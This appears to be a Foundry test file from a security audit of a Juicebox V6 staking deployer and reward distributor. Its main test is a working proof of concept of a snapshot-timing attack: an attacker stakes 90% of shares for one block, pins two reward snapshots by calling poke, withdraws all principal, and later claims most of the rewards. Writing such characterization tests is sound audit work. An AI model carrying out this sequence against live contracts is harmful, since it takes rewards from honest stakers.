// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IJBToken} from "@bananapus/core-v6/src/interfaces/IJBToken.sol";
import {TestBaseWorkflow} from "@bananapus/core-v6/test/helpers/TestBaseWorkflow.sol";
import {JBTokenDistributor} from "@bananapus/distributor-v6/src/JBTokenDistributor.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IREVLoans} from "@rev-net/core-v6/src/interfaces/IREVLoans.sol";
import {IREVOwner} from "@rev-net/core-v6/src/interfaces/IREVOwner.sol";

import {JBStickyDeployer} from "../src/JBStickyDeployer.sol";

contract JBStickySnapshotTestToken is ERC20 {
    constructor() ERC20("Reward audit", "RA") {}

    function mint(address holder, uint256 amount) external {
        _mint({account: holder, value: amount});
    }
}

/// @notice Characterizes the pinned distributor's snapshot timing against real V6 contracts.
contract JBStickyRewardSnapshotTest is TestBaseWorkflow {
    address internal _holder = makeAddr("established holder");
    address internal _attacker = makeAddr("snapshot attacker");
    JBStickySnapshotTestToken internal _underlying;
    JBStickyDeployer internal _deployer;
    JBTokenDistributor internal _distributor;
    IJBToken internal _stickyToken;
    uint256 internal _projectId;

    function setUp() public override {
        super.setUp();
        _underlying = new JBStickySnapshotTestToken();
        _deployer = new JBStickyDeployer({controller: jbController(), terminal: jbMultiTerminal()});
        _distributor = new JBTokenDistributor({
            directory: jbDirectory(),
            controller: jbController(),
            revLoans: IREVLoans(address(0)),
            revOwner: IREVOwner(address(0)),
            initialRoundDuration: 1 weeks,
            initialVestingRounds: 4,
            initialClaimDuration: 3 * 365 days
        });
        uint256 fee = jbProjects().creationFee();
        vm.deal(address(this), fee);
        _projectId = _deployer.deployStickyFor{value: fee}({
            stakedToken: IERC20Metadata(address(_underlying)),
            name: "Sticky reward audit",
            symbol: "sRA",
            projectUri: "",
            cashOutTaxRate: 0,
            granters: new address[](0),
            soulbound: true
        });
        _stickyToken = jbTokens().tokenOf(_projectId);
        _underlying.mint({holder: _holder, amount: 100e18});
        _underlying.mint({holder: _attacker, amount: 900e18});
        _underlying.mint({holder: address(this), amount: 200e18});
        _underlying.approve({spender: address(_distributor), value: 200e18});
        _stake({holder: _holder, amount: 100e18});
        vm.roll(vm.getBlockNumber() + 1);
    }

    function test_oneBlockStakeCapturesTwoWeeklyRoundsWithAllPrincipalRecovered() public {
        // Hold ninety percent of shares for one block, then permissionlessly fix both reward snapshots.
        _stake({holder: _attacker, amount: 900e18});
        uint256 attackerBlock = vm.getBlockNumber();
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(_attacker);
        _distributor.poke();
        assertEq(_distributor.roundSnapshotBlock(0), attackerBlock);
        assertEq(_distributor.roundSnapshotBlock(1), attackerBlock);

        // Exit before either reward is funded. Zero-tax projects return the entire deposit.
        uint256 cashOutCount = _stickyToken.balanceOf(_attacker);
        vm.prank(_attacker);
        uint256 reclaimed = jbMultiTerminal().cashOutTokensOf({
            holder: _attacker,
            projectId: _projectId,
            cashOutCount: cashOutCount,
            tokenToReclaim: address(_underlying),
            minTokensReclaimed: 900e18,
            beneficiary: payable(_attacker),
            metadata: bytes("")
        });
        assertEq(reclaimed, 900e18);
        assertEq(_underlying.balanceOf(_attacker), 900e18);
        assertEq(_stickyToken.balanceOf(_attacker), 0);
        assertEq(_deployer.HOOK().stakedBalanceOf(_projectId, _attacker), 0);

        _fund(100e18);
        vm.warp(_distributor.roundStartTimestamp(1));
        vm.roll(vm.getBlockNumber() + 1);
        _fund(100e18);

        vm.warp(_distributor.roundStartTimestamp(2));
        vm.roll(vm.getBlockNumber() + 1);
        uint256[] memory ids = new uint256[](1);
        ids[0] = uint256(uint160(_attacker));
        IERC20[] memory rewards = new IERC20[](1);
        rewards[0] = IERC20(address(_underlying));
        _distributor.beginVesting({hook: address(_stickyToken), tokenIds: ids, tokens: rewards});
        assertEq(_distributor.claimedFor(address(_stickyToken), ids[0], rewards[0]), 180e18);

        vm.warp(_distributor.roundStartTimestamp(6));
        vm.roll(vm.getBlockNumber() + 1);
        _distributor.collectVestedRewards({
            hook: address(_stickyToken), tokenIds: ids, tokens: rewards, beneficiary: _attacker
        });
        assertEq(_underlying.balanceOf(_attacker), 1080e18);
        assertEq(_underlying.balanceOf(address(_distributor)), 20e18);
    }

    function test_fundingPinsOnlyCurrentRoundWhilePokeAlsoPinsNextRound() public {
        _fund(100e18);
        assertEq(_distributor.roundSnapshotBlock(0), vm.getBlockNumber() - 1);
        assertEq(_distributor.roundSnapshotBlock(1), 0);

        vm.roll(vm.getBlockNumber() + 1);
        _distributor.poke();
        assertEq(_distributor.roundSnapshotBlock(1), vm.getBlockNumber() - 1);
    }

    function _stake(address holder, uint256 amount) internal {
        vm.startPrank(holder);
        _underlying.approve({spender: address(jbMultiTerminal()), value: amount});
        jbMultiTerminal().pay({
            projectId: _projectId,
            token: address(_underlying),
            amount: amount,
            beneficiary: holder,
            minReturnedTokens: amount,
            memo: "",
            metadata: bytes("")
        });
        vm.stopPrank();
    }

    function _fund(uint256 amount) internal {
        _distributor.fund({hook: address(_stickyToken), token: IERC20(address(_underlying)), amount: amount});
    }
}
